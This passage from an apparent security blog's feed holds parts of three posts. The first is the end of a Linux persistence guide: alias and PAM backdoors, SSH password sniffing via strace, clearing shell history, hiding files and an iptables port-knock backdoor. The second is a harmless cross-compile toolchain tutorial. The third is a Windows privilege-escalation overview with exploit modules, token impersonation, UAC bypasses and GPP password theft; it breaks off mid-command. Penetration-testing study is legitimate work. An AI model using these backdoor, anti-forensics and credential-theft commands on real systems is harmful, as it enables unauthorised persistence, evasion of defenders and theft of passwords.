<li><code>alias</code> to start backdoor</li>
</ol>
<ul>
<li><code>alias cat=&#39;cat&amp;&amp;/root/.shell&#39;</code></li>
<li>similar to <code>sshd</code> soft link</li>
</ul>
<ol start="5">
<li><code>pam</code> backdoor</li>
</ol>
<ul>
<li>patch <code>pam_unix_auth.c</code> to capture password</li>
</ul>
<ol start="6">
<li><code>PROMPT_COMMAND</code> backdoor</li>
</ol>
<ul>
<li><code>PROMPT_COMMAND</code> will execute before you run commands</li>
<li><code>export PROMPT_COMMAND=&quot;your_cmd&quot;</code></li>
</ul>
<ol start="7">
<li><code>ssh</code> log-without-pass</li>
</ol>
<ul>
<li>write <code>id_rsa.pub</code> to <code>~/.ssh/authorized_keys</code></li>
</ul>
<ol start="8">
<li><code>ssh</code> wrapper</li>
<li><code>ssh</code> keylogger</li>
<li><code>strace</code> to listen <code>ssh</code> source traffic</li>
</ol>
<ul>
<li>(strace -f -F -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</li>
<li>grep -E ‘read(6, “.+\0\0\0\.+”‘ &#x2F;tmp&#x2F;.sshd.log</li>
</ul>
<ol start="11">
<li>And the <a class="link"   href="https://github.com/d30sa1/RootKits-List-Download" >rootkit<i class="fas fa-external-link-alt"></i></a></li>
<li>…</li>
</ol>
<h3 id="Hide-yourself"><a href="#Hide-yourself" class="headerlink" title="Hide yourself"></a>Hide yourself</h3><ol>
<li>Hide files into hidden directories like <code>/tmp/.xxx/</code>, or name it with prefix <code>.</code>.</li>
<li>Hide privs, using <code>lsattr</code> and <code>chattr</code> </li>
<li>Close history log: <code>[space]set +o history</code> <ul>
<li>restart by <code>[Space]set -o history</code></li>
<li><code>history -c</code> to clean current terminal history</li>
<li><code>history|grep &quot;xxx&quot; &amp;&amp; history -d [num]</code> to clean specified one</li>
</ul>
</li>
<li>Port reuse</li>
</ol>
<ul>
<li>iptables<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># the chain</span></span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"><span class="comment"># the rule</span></span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"><span class="comment"># start-switch</span></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathuntercoming&#x27;</span> --algo bm -m recent --<span class="built_in">set</span> --name letmein --rsource -j ACCEPT</span><br><span class="line"><span class="comment"># stop-switch</span></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathunterleaving&#x27;</span> --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"><span class="comment"># let&#x27;s do it</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br><span class="line"></span><br><span class="line"><span class="comment"># start </span></span><br><span class="line"><span class="built_in">echo</span> threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line"><span class="comment"># ssh port 80 to login </span></span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line"><span class="comment"># stop </span></span><br><span class="line"><span class="built_in">echo</span> threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure></li>
<li>SSLH</li>
</ul>
<ol start="5">
<li>Hide process: <a class="link"   href="https://github.com/gianlucaborello/libprocesshider" >libprocesshider<i class="fas fa-external-link-alt"></i></a></li>
</ol>
<ul>
<li>and unhide process <a class="link"   href="https://www.unhide-forensics.info/" >unhide<i class="fas fa-external-link-alt"></i></a></li>
<li>or process inject using <a class="link"   href="https://github.com/gaffe23/linux-inject.git" >linux-inject<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ol start="6">
<li>…</li>
</ol>
<p>Addition:<br>To steal credentials on <code>Linux</code>:<br>Use <code>grep -rn &quot;password=&quot; /</code> to search all disk.<br>Use <a class="link"   href="https://github.com/sevagas/swap_digger" >swap_digger<i class="fas fa-external-link-alt"></i></a> to analyze <code>swap</code> automatically, and <a class="link"   href="https://github.com/ph4ntonn/Impost3r" >Impost3r<i class="fas fa-external-link-alt"></i></a> to steal linux password (<code>ssh</code>, <code>su</code>, <code>sudo</code>).</p>
<p>Here recommends a linux post-exploitation framework <a class="link"   href="https://github.com/jm33-m0/emp3r0r" >emp3r0r<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Using-Pentest-Framework"><a href="#Using-Pentest-Framework" class="headerlink" title="Using Pentest Framework"></a>Using Pentest Framework</h2><ol>
<li>Metasploit Framework (<code>run *</code> to run all modules in meterpreter)</li>
</ol>
<ul>
<li><code>persistence</code> module</li>
<li><code>metsvc</code> module</li>
<li><code>scheduleme</code> &amp; <code>schtasksabuse</code> module</li>
<li><a class="link"   href="https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb" >mof_ps_persist<i class="fas fa-external-link-alt"></i></a> module</li>
<li><code>Autorunscript</code> (not a module in meterpreter) and other advanced options of <code>exploit</code> module.</li>
</ul>
<ol start="2">
<li>Empire</li>
</ol>
<ul>
<li>It provides 18 methods (4 categories, <code>usemodule persistence/</code> to see)</li>
</ul>
<table>
<thead>
<tr>
<th>elevated</th>
<th>misc</th>
<th>powerbreach</th>
<th>userland</th>
</tr>
</thead>
<tbody><tr>
<td>registry*</td>
<td>add_netuser</td>
<td>deaduser</td>
<td>backdoor_lnk</td>
</tr>
<tr>
<td>schtasks*</td>
<td>add_sid_history*</td>
<td>eventlog*</td>
<td>registry</td>
</tr>
<tr>
<td>wmi*</td>
<td>debugger*</td>
<td>resolver</td>
<td>schtasks</td>
</tr>
<tr>
<td>wmi_updater*</td>
<td>disable_machine_acct_change*</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>get_ssps</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>install_ssp*</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>memssp*</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>skeleton_key*</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ol start="3">
<li>Cobalt Strike</li>
</ol>
<ul>
<li>produce powershell backdoor: Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery</li>
<li>add startups into service or registry using given shell</li>
</ul>
<ol start="4">
<li>other frameworks …</li>
</ol>
<h2 id="Other-resources"><a href="#Other-resources" class="headerlink" title="Other resources"></a>Other resources</h2><ul>
<li><a class="link"   href="https://github.com/Karneades/awesome-malware-persistence" >Awesome Malware Persistence<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>Cross Compile Toolchains</title>
    <url>/2021/01/08/2021-01-08-Cross-Compile-Toolchains/</url>
    <content><![CDATA[<p>Just now I found the site <a class="link"   href="https://toolchains.bootlin.com/" >toolchains.bootlin.com<i class="fas fa-external-link-alt"></i></a> to download suitable prebuilt toolchain, it provides detailed <code>GCC</code>&#x2F;<code>GDB</code>&#x2F;<code>Linux Header</code> versions. </p>
<p>Before knowing this site, I tried <code>buildroot</code> and <code>crosstool-ng</code> to build my own toolchain, here is to share the experience.</p>
<p>But to be honest the <a class="link"   href="https://toolchains.bootlin.com/" >toolchains.bootlin.com<i class="fas fa-external-link-alt"></i></a> seems better, because it built tools for us, and you can choose version of <code>GCC</code> and <code>GDB</code>, while <code>buildroot</code> and <code>crosstool-ng</code> can’t.</p>
<h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p><a class="link"   href="https://buildroot.org/" >Buildroot<i class="fas fa-external-link-alt"></i></a> is a framework to build embedded Linux software on Linux. It is made up of <code>makefile</code> and <code>Kconfig</code> configuration files. L</p>
<p>ike compiling Linux kernel, configure <code>buildroot</code> and edit <code>menuconfig</code> to compile a complete Linux system software (including boot, kernel, rootfs and libs) that can be directly burned and run on the machine.</p>
<p>Download <code>buildroot</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span><br><span class="line">$ tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">$ <span class="built_in">cd</span> buildroot</span><br></pre></td></tr></table></figure>
<p>Configure <code>buildroot</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install libncurses-dev patch</span><br><span class="line">$ make clean</span><br><span class="line">$ make menuconfig</span><br></pre></td></tr></table></figure>
<p>When interface shows up like this,<br><img src="/imghost/rpp/7.jpg" alt="Target Option"><br>Set <code>Target Architecture</code> as <code>MIPS (little endian)</code> (depending on your target);<br><img src="/imghost/rpp/8.jpg" alt="Target Architecture"><br>Set <code>Kernel Headers</code> as your host Linux version,because it will run on your pc.<br><img src="/imghost/rpp/9.jpg" alt="Kernel Headers"></p>
<p>Install it. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install texinfo</span><br><span class="line">$ sudo apt-get install bison</span><br><span class="line">$ sudo apt-get install flex</span><br><span class="line">$ sudo make</span><br></pre></td></tr></table></figure>
<p>Compiled files will be found in directory <code>output</code>. Cross compile utils will be in <code>buildroot/output/host/usr/bin</code>, and the compiler is <code>mips-linux-gcc</code>.</p>
<p>Configure environment variables and test.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gedit ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:Path/to/buildroot/output/host/usr/bin</span><br><span class="line">$ <span class="built_in">source</span> ~/.bashrc</span><br><span class="line"></span><br><span class="line">$ mips-linux-gcc -o <span class="built_in">test</span> test.c -static</span><br></pre></td></tr></table></figure>

<h2 id="Crosstool-NG"><a href="#Crosstool-NG" class="headerlink" title="Crosstool-NG"></a>Crosstool-NG</h2><p>You can visit <a class="link"   href="http://crosstool-ng.github.io/" >official site<i class="fas fa-external-link-alt"></i></a> for its introduction and documentation.</p>
<p>I installed it by source code</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/crosstool-ng/crosstool-ng</span><br><span class="line">$ ./bootstrap   <span class="comment"># needed before running ./configure</span></span><br><span class="line">$ ./configure --prefix=/some/place</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$&#123;PATH&#125;</span>:/some/place/bin&quot;</span></span><br></pre></td></tr></table></figure>
<p>If you are <code>root</code> user, you’ll get </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./ct-ng build</span><br><span class="line">[ERROR]  You must NOT be root to run crosstool-NG</span><br><span class="line">[00:00] / gmake: *** [ct-ng:262: build] Error 1</span><br></pre></td></tr></table></figure>
<p>To solve it, add things to <code>./ct-ng</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim ./ct-ng</span><br><span class="line">... <span class="comment"># add the following</span></span><br><span class="line"><span class="built_in">export</span> CT_EXPERIMENTAL:=y</span><br><span class="line"><span class="built_in">export</span> CT_ALLOW_BUILD_AS_ROOT:=y</span><br><span class="line"><span class="built_in">export</span> CT_ALLOW_BUILD_AS_ROOT_SURE:=Y</span><br></pre></td></tr></table></figure>
<p>It can be operated like <code>buildroot</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /some/place/bin</span><br><span class="line">$ ls -a</span><br><span class="line">.  ..  ct-ng</span><br><span class="line">$ ./ct-ng menuconfig</span><br></pre></td></tr></table></figure>
<p>Or a more convenient way, use the templates&#x2F;samples</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./ct-ng list-samples      <span class="comment"># show templates</span></span><br><span class="line">Status  Sample name</span><br><span class="line">[G..X]   aarch64-ol7u9-linux-gnu</span><br><span class="line">[G..X]   aarch64-rpi3-linux-gnu</span><br><span class="line">[G..X]   aarch64-unknown-linux-android</span><br><span class="line">[G..X]   aarch64-unknown-linux-gnu</span><br><span class="line">[G..X]   aarch64-unknown-linux-uclibc</span><br><span class="line">...</span><br><span class="line">$ ./ct-ng mips-malta-linux-gnu  <span class="comment"># choose one</span></span><br><span class="line">  CONF  mips-malta-linux-gnu</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># configuration written to .config</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">***********************************************************</span><br><span class="line"></span><br><span class="line">Initially reported by: Antony Pavlov</span><br><span class="line">URL:</span><br><span class="line"></span><br><span class="line">Comment:</span><br><span class="line">Experimental toolchain <span class="keyword">for</span> MIPS32r2</span><br><span class="line"></span><br><span class="line">***********************************************************</span><br><span class="line"></span><br><span class="line">Now configured <span class="keyword">for</span> <span class="string">&quot;mips-malta-linux-gnu&quot;</span></span><br><span class="line">$ ./ct-ng build</span><br><span class="line">[INFO ]  Performing some trivial sanity checks</span><br><span class="line">[WARN ]  Number of open files 1024 may not be sufficient to build the toolchain; increasing to 2048</span><br><span class="line">...</span><br><span class="line">$ ls -a</span><br><span class="line">.  ..  .build  build.log  .config  .config.old  ct-ng</span><br><span class="line">$ ls .build/</span><br><span class="line">mips-malta-linux-gnu  src  tarballs  tools</span><br></pre></td></tr></table></figure>
<p>Now the <code>ct-ng</code> downloads what it needs to <code>.build</code> dir according to <code>.config</code> (made automatically).<br>However these are not what produced. Check your home dir u will find <code>x-tools</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">mips-malta-linux-gnu</span><br><span class="line">$ ls mips-malta-linux-gnu/</span><br><span class="line">bin  build.log.bz2  include  lib  libexec  mips-malta-linux-gnu  share</span><br></pre></td></tr></table></figure>
<p>These are the built toolchain.</p>
<p>The truth is, the binarys compiled by it cannot run on old kernels (encounter <code>FATAL:kernel too old</code> in <code>QEMU</code>), that might because the libs (<code>~/x-tools/mips-malta-linux-gnu/mips-malta-linux-gnu/sysroot/lib/ld-2.32.so</code>) it use are latest.</p>
<p>So for old devices or <code>QEMU</code>, better use <a class="link"   href="https://buildroot.org/" >buildroot<i class="fas fa-external-link-alt"></i></a>, or try <a class="link"   href="https://toolchains.bootlin.com/" >toolchains.bootlin.com<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Compile-GDB-amp-GDBserver"><a href="#Compile-GDB-amp-GDBserver" class="headerlink" title="Compile GDB&amp;GDBserver"></a>Compile GDB&amp;GDBserver</h2><p>It is for dynamic analysis, and I almost messed up by this. Get source code on <a class="link"   href="http://ftp.gnu.org/gnu/gdb/" >FTP<i class="fas fa-external-link-alt"></i></a></p>
<p>First see how to set configuration</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./configure --target=mipsel-linux --host=mipsel-linux --program-prefix=mipsel-linux  --prefix=`<span class="built_in">echo</span> <span class="variable">$PWD</span>`/bin CC=/path/to/buildroot/output/host/bin/mipsel-linux-gcc CXX=/path/to/buildroot/output/host/bin/mipsel-linux-g++  AR=/path/to/buildroot/output/host/bin/mipsel-linux-ar LD=/path/to/buildroot/output/host/bin/mipsel-linux-ld RANLIB=/path/to/buildroot/output/host/bin/mipsel-linux-ranlib  STRIP=/path/to/buildroot/output/host/bin/mipsel-linux-strip CFLAGS=<span class="string">&quot;-w -static&quot;</span> CXXFLAGS=<span class="string">&quot;-w -static&quot;</span> LDFLAGS=<span class="string">&quot;-static&quot;</span></span><br><span class="line">...   <span class="comment"># make sure paths are absolute</span></span><br><span class="line">$ sudo make -j8</span><br><span class="line">...</span><br><span class="line">$ make install</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Recommended versions includes <code>7.10</code> …<br>Versions too high cause <code>configure: error: ***A compiler with support for c++11 language features is required</code>, while lower versions gives <code>configure: error: no termcap library found</code>.</p>
<p>However problems still come out, if your toolchain is so latest, or if some other libraries are required. </p>
<p>The <a class="link"   href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" >built gdbservers<i class="fas fa-external-link-alt"></i></a> are off the shelf, you can use them or things built by others directly.</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>gcc</tag>
        <tag>arm</tag>
        <tag>mips</tag>
        <tag>gdb</tag>
        <tag>buildroot</tag>
        <tag>crosstool-ng</tag>
        <tag>cross-compile</tag>
      </tags>
  </entry>
  <entry>
    <title>About Privilege Escalation</title>
    <url>/2021/02/19/2021-02-19-About-Privilege-Escalation/</url>
    <content><![CDATA[<p>Recently I get some time to collect materials about privilege escalation, provide you with useful tools and some basic knowledge (overview, not details).</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>You can refer to <a class="link"   href="https://www.fuzzysecurity.com/tutorials/16.html" >Windows Privilege Escalation Fundamentals<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" >Windows Privilege Escalation Guide<i class="fas fa-external-link-alt"></i></a>.</p>
<p>We skip <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Information-Gathering">Information Gathering</a> part and continue learning other things.</p>
<h3 id="Kernel-Exploit"><a href="#Kernel-Exploit" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Tools to search patch vulnerability </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/ianxtianxt/win-exp-</span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits</span><br></pre></td></tr></table></figure>
<p>Or</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># query manual</span></span><br><span class="line">&gt; systeminfo</span><br><span class="line">&gt; Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_patches</span><br><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell script</span></span><br><span class="line">&gt; <span class="built_in">Import-Module</span> C:\Sherlock.ps1 (from `https://github.com/rasta<span class="literal">-mouse</span>/Sherlock`)</span><br><span class="line">&gt; <span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
<p>Or use crafted <code>wmic_info.bat</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) <span class="keyword">do</span> <span class="built_in">set</span> <span class="string">&quot;var=%%A&quot;</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic <span class="built_in">group</span> list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic nicconfig <span class="built_in">where</span> IPEnabled=<span class="string">&#x27;true&#x27;</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">&quot;%var%&quot;</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure>

<p>And some MSF exploits:<br>Windows ClientCopyImage Win32k Exploit</p>
<ul>
<li>Windows 7 x64, x86, Windows 2008 R2 SP1 x64</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image</li>
</ul>
<p>Windows TrackPopupMenu Win32k NULL pointer dereference</p>
<ul>
<li>Windows XP SP3, Windows Server 2003 SP2, Windows 7 SP1 Windows Server 2008 32, Windows Server 2008 R2 SP1 64</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu</li>
</ul>
<p>KiTrap0D exploit</p>
<ul>
<li>Windows Server 2003 32, Windows Server 2008 32, Windows 7 32, Windows XP</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</li>
</ul>
<p>Task Scheduler XML escalation</p>
<ul>
<li>Windows Vista, Windows 7, Windows Server 2008 x64 and x86</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator</li>
</ul>
<p>MS16-016 mrxdav.sys WebDav local escalation</p>
<ul>
<li>Windows 7 SP1 x86</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms16_016_webdav</li>
</ul>
<p>EPATHOBJ::pprFlattenRec local escalation</p>
<ul>
<li>Windows XP SP3, Windows 2003 SP1, Windows 7 SP1</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec</li>
</ul>
<p>MS13-053 : NTUserMessageCall Win32k kernel pool overflow</p>
<ul>
<li>Windows 7 SP1 x86</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_ schlamperei</li>
</ul>
<p>MS16-032 Secondary Logon Handle escalation</p>
<ul>
<li>Windows 7-10, 2k8-2k12 32&#x2F;64, Powershell 2.0 and higher Windows version</li>
<li>exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</li>
</ul>
<p><a class="link"   href="https://github.com/foxglovesec/RottenPotato" >RottenPotato<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; load incognito <span class="comment"># or use incognito</span></span><br><span class="line">meterpreter&gt; list_token -u  <span class="comment"># see any token to use</span></span><br><span class="line">WIN-2HU3N1\Administrator</span><br><span class="line">meterpreter&gt; impersonate_token WIN-2HU3N1\\Administrator</span><br><span class="line"><span class="comment"># or use rotten potato directly</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/foxglovesec/RottenPotato.git</span><br><span class="line">$ <span class="built_in">cd</span> RottenPotato</span><br><span class="line"><span class="comment"># find rottenpotato.exe</span></span><br><span class="line">meterpreter&gt; upload /root/Desktop/RottenPotato/rottenpotato.exe .</span><br><span class="line">meterpreter&gt; execute -Hc -f rottenpotato.exe</span><br><span class="line">meterpreter&gt; impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Config-Error"><a href="#Config-Error" class="headerlink" title="Config Error"></a>Config Error</h3><p>This includes system service priv setting error, trusted service path vulns, scheduled tasks.</p>
<p>Methods to check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Empire module</span><br><span class="line">privesc/powerup/allchecks</span><br></pre></td></tr></table></figure>
<p>System service privilege config:<br>As services started when booting up are with high privs, if they are exploitable, we can use them to elevate.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powershell attack script</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"><span class="comment"># MSF attack module, need a given session</span></span><br><span class="line">exploit/windows/local/service_permissions</span><br></pre></td></tr></table></figure>
<p>Trusted service path vulns:<br>If a service executable path is without <code>&quot;</code> and has <code>&lt;space&gt;</code>, then it is vulnerable.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Search vulnerable service</span></span><br><span class="line">&gt; wmic service get name,displayname,pathname,startmode | findstr /i <span class="string">&quot;Auto&quot;</span> | findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"># MSF attack module</span></span><br><span class="line"><span class="string">exploit/windows/local/trusted_service_path</span></span><br><span class="line"><span class="string"># Need to migrate, because it disconnect automatically</span></span><br><span class="line"><span class="string">set AutoRunScript migrate -f</span></span><br></pre></td></tr></table></figure>
<p>Scheduled tasks:<br>Since tasks executed by high privileged users, if service dirs are editable, they are vlunerable.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check scheduled tasks </span></span><br><span class="line">&gt; schtasks /query /fo LIST /v</span><br><span class="line"><span class="comment"># Check privs of specified dir</span></span><br><span class="line">&gt; accesschk.exe <span class="literal">-dqv</span> <span class="string">&quot;D:\test&quot;</span> <span class="literal">-accepteula</span></span><br></pre></td></tr></table></figure>

<h3 id="GPP-Privilege-Escalation"><a href="#GPP-Privilege-Escalation" class="headerlink" title="GPP Privilege Escalation"></a>GPP Privilege Escalation</h3><p>Group Policy Preferences (GPP) </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powershell obtain cpassword</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line"><span class="comment">#MSF</span></span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MSF</span></span><br><span class="line">exploit/windows/local/ask       <span class="comment"># pop up a window, click to get system</span></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line"><span class="comment">#Powershell</span></span><br><span class="line">https://github.com/samratashok/nishang/blob/master/Escalation/<span class="built_in">Invoke-PsUACme</span>.ps1</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br></pre></td></tr></table></figure>

<h3 id="Token-Stealing"><a href="#Token-Stealing" class="headerlink" title="Token Stealing"></a>Token Stealing</h3><p>Use <a class="link"   href="https://github.com/foxglovesec/RottenPotato" >RottenPotato<i class="fas fa-external-link-alt"></i></a>.</p>
<h3 id="Without-Token"><a href="#Without-Token" class="headerlink" title="Without Token"></a>Without Token</h3><p>Use <a class="link"   href="https://github.com/SpiderLabs/Responder" >Responder.py<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="For-Different-OS-Version"><a href="#For-Different-OS-Version" class="headerlink" title="For Different OS Version"></a>For Different OS Version</h3><ol>
<li><p>Windows2000&#x2F;2003, XP<br>Use <code>at</code>(set scheduled tasks) to let users in <code>Administrator</code> group elevated to <code>SYSTEM</code> </p>
</li>
<li><p>Windows 7&#x2F;8, 03&#x2F;08, 12&#x2F;16</p>
</li>
</ol>
<ul>
<li><p><code>sc</code> to control service</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">sc</span> Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">&gt; <span class="built_in">sc</span> <span class="built_in">start</span> systcmd</span><br></pre></td></tr></table></figure></li>
<li><p>AlwaysInstallElevated: allow non-admin users run <code>*.msi</code> to install with <code>SYSTEM</code> privs</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># disabled by default</span></span><br><span class="line">[<span class="type">HKEY_CURRENT_USER</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line">[<span class="type">HKEY_LOCAL_MACHINE</span>\<span class="type">SOFTWARE</span>\<span class="type">Policies</span>\<span class="type">Microsoft</span>\<span class="type">Windows</span>\<span class="type">Installer</span>] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line"><span class="comment"># check using</span></span><br><span class="line">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:&gt; reg query 